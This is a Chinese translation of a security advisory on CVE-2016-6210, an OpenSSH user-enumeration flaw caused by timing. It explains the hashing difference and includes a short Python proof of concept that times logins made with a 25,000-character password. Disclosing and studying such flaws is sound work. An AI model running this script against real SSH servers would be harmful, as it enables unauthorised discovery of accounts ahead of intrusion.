> 原文链接: https://www.anquanke.com//post/id/84232 


# OpenSSHD用户枚举漏洞


                                阅读量   
                                **91616**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：360安全播报
                                <br>原文地址：[http://seclists.org/fulldisclosure/2016/Jul/51](http://seclists.org/fulldisclosure/2016/Jul/51)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t018f521842a855bf09.png)](https://p2.ssl.qhimg.com/t018f521842a855bf09.png)

**摘要:**

**通过发送一个长密码,一个远程用户可以枚举在系统上运行SSHD的用户。**

**这个问题存在于大多数的现代配置中,因为相比于计算BLOWFISH哈希散列,需要更长的时间来计算SHA256 / SHA512。******

**CVE-ID:CVE-2016-6210**********

**<br>**

**测试的版本:**

这个问题在版本opensshd – 7.2 – p2(也应该在更早期的版本上进行测试)上进行了测试。

**<br>**

**修复:**

这个问题被OPENSSH的开发小组报道,而且他们已经开发出了一个修复补丁(不过目前还不知道这个补丁是否发布)。(特别感谢'dtucker () zip com au'的快速回复和解决建议)。

**<br>**

**详细信息:**

当SSHD试图验证一个不存在的用户时,它会进入一个硬编码在SSHD源代码中的假密码结构。在这个硬编码的密码结构中密码的哈希计算基于BLOWFISH 算法。如果是一个真实的有效用户密码,则会使用SHA256 / SHA512进行哈希计算。由于计算SHA256 / SHA512哈希比计算BLOWFISH哈希耗时要长,所以如果发送的密码大于10KB,将会导致相比于不存在的用户来说收到来自服务器的响应会存在一个时间差。

**<br>**

**示例代码:**



```
import paramiko
import time
user=raw_input("user: ")
p='A'*25000
ssh = paramiko.SSHClient()
starttime=time.clock()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
        ssh.connect('127.0.0.1', username=user,
        password=p)
except:
        endtime=time.clock()
total=endtime-starttime
print(total)
```

(有效的用户将会需要更高的总时间)。

请注意,如果SSHD配置禁止root登录,那么root就不被视为有效的用户…

如果启用了TCP时间戳选项,那么度量时间的最佳方法是使用来自服务器的TCP数据包的时间戳,因为这将会消除任何网络延迟。
